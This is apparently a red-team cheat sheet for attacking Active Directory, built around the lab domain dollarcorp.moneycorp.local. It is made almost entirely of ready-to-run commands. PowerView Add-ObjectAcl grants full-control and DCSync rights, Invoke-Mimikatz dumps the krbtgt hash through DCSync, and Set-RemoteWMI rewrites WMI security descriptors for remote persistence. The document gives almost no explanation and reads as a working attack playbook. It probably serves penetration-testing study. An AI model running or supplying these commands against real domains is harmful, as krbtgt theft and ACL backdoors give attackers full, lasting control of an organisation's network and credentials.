# DCSync

## **Add full-control rights**

```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
```

## **Add rights for DCsync**

```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```

## **Execute DCSync and dump krbtgt**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

## Security Descriptor - WMI

```
. ./Set-RemoteWMI.ps1
```

## **On a local machine**

```
Set-RemoteWMI -Username <username> -Verbose
```

## **On a remote machine without explicit credentials**

```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose
```

## **On a remote machine with explicit credentials**

Only root/cimv and nested namespaces

```
Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

## **On remote machine remove permissions**

```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose
```

## **Check WMI permissions**

```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```
